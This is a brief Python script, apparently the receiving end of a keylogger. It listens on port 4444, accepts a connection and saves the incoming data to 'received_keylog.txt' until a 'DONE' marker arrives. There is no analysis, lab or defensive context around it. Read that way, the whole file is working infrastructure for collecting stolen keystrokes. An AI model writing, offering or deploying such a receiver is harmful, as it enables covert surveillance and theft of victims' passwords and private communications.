import socket

def receive_log():
    host = "0.0.0.0"
    port = 4444

    with socket.socket() as s:
        s.bind((host, port))
        s.listen(1)
        conn, addr = s.accept()
        print(f"[+] Connection from {addr}")

        with open("received_keylog.txt", "wb") as f:
            while True:
                data = conn.recv(1024)
                if b"DONE" in data:
                    break
                f.write(data)

receive_log()
